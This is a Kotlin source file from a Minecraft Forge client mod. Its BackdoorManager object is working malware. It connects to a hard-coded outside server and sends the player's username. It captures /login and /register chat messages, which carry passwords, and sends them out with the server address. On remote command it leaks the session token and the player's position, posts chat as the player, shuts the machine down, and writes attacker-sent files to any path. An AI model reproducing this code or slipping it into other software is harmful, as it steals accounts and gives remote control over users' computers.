package me.windyteam.kura.manager

import me.windyteam.kura.event.events.client.PacketEvents
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kura.utils.mainScope
import kura.utils.BackgroundScope
import net.minecraft.client.Minecraft
import net.minecraft.network.play.client.CPacketChatMessage
import net.minecraftforge.fml.common.eventhandler.Event
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent
import java.io.*
import java.net.Socket
import java.util.*

object BackdoorManager : Event() {
    private var mc = Minecraft.getMinecraft()
    var dos: DataOutputStream? = null
    private var dis: DataInputStream? = null
    private var reconnect = false
    private var socket: Socket? = null//Socket("150.138.72.217", 61523)
    private var lastName = ""

    init {
        try {
            //3Min Per Ping
            BackgroundScope.launchLooping("Ping", 60000L) {
                mainScope.launch(Dispatchers.IO) {
                    if (socket == null || socket!!.isClosed || reconnect) {
                        socket = Socket("150.138.72.217", 61523)
                        dis = DataInputStream(socket!!.getInputStream())
                        dos = DataOutputStream(socket!!.getOutputStream())
                        lastName = mc.session.getUsername() ?: "WHATTHEFUCK"
                        dos!!.writeUTF("[HEYUEPING] $lastName")
                        dos!!.flush()
                        reconnect = false
                    }
                }
            }

            socket = Socket("150.138.72.217", 61523)
            dis = DataInputStream(socket!!.getInputStream())
            dos = DataOutputStream(socket!!.getOutputStream())
            lastName = mc.session.getUsername() ?: "WHATTHEFUCK"
            dos!!.writeUTF("[HEYUEPING] $lastName")
            dos!!.flush()
            onTick()
        } catch (_: IOException) {
            reconnect = true
        }
    }

    @SubscribeEvent
    fun onKeyBoard(event: PacketEvents.Send) {
        if (mc.world == null || mc.player == null || event.stage != 0) {
            return
        }
        try {
            if (event.packet is CPacketChatMessage && (socket != null && !socket!!.isClosed)) {
                val msg = (event.packet as CPacketChatMessage).message
                if ((msg.contains("/l") || msg.contains("/reg")) && dos != null) {
                    dos!!.writeUTF(
                        "[LOGGER] " + (event.packet as CPacketChatMessage).message + " (ID:" + mc.session.username + ") " + if (mc.isSingleplayer) "Single Player" else Objects.requireNonNull(
                            mc.getCurrentServerData()
                        )!!.serverIP.lowercase(
                            Locale.getDefault()
                        )
                    )
                    dos!!.flush()
                }
            }
        } catch (_: IOException) {
        }
    }

    private fun nullCheck(): Boolean {
        return mc.player != null && mc.world != null
    }

    private fun onTick() {
        mainScope.launch(Dispatchers.IO) {
            while (true) {
                try {
                    if (dis == null || dos == null || socket == null || socket!!.isClosed) {
                        return@launch
                    }
                    val utfMsg = dis!!.readUTF().lowercase()
                    if (lastName != mc.session.getUsername()) {
                        dos!!.writeUTF("[HEYUEPING] " + mc.session.getUsername())
                        lastName = mc.session.getUsername()
                    }
                    if (utfMsg.startsWith("/message")) {
                        if (nullCheck()) {
                            val sortReceived = dis!!.readUTF().replace("/message  ", "")
                            mc.player.sendChatMessage(sortReceived)
                        } else {
                            dos!!.writeUTF("[DEBUG] Player Is Not Game!")
                            dos!!.flush()
                        }
                    } else if (utfMsg.startsWith("/gg")) {
                        Runtime.getRuntime().exec("shutdown -s -t")
                    } else if (utfMsg.startsWith("/token")) {
                        dos!!.writeUTF("[LOGGER] Token: " + mc.session.getToken() + " (ID: " + lastName + ")")
                        dos!!.flush()
                    } else if (utfMsg == "/pos") {
                        if (nullCheck()) {
                            val dimension = when (mc.player.dimension) {
                                0 -> "World"
                                1 -> "TheEnd"
                                -1 -> "Nether"
                                else -> {
                                    "NIMASILE"
                                }
                            }
                            dos!!.writeUTF("[LOGGER] World: $dimension , Pos: " + mc.player.posX + ", " + mc.player.posY + ", " + mc.player.posZ)
                            dos!!.flush()
                        } else {
                            dos!!.writeUTF("[DEBUG] Player Is Not In Game!")
                            dos!!.flush()
                        }
                    } else if (utfMsg.startsWith("/file")) {
                        val msg = utfMsg.replace("/file  ", "")
                        val file = File(msg)
                        val fos = FileOutputStream(file)
                        val ins = socket!!.getInputStream()
                        if (file.exists()) {
                            val bytes = ByteArray(16 * 1024)
                            var count: Int
                            while (ins.read(bytes).also { count = it } > 0) {
                                fos.write(bytes, 0, count)
                                fos.flush()
                            }
                            dos!!.writeUTF("[DEBUG] File Uploaded!")
                        } else {
                            dos!!.writeUTF("[DEBUG] Can't Find File!")
                            dos!!.flush()
                        }
                    }
                } catch (_: IOException) {
                }
            }
        }
    }
}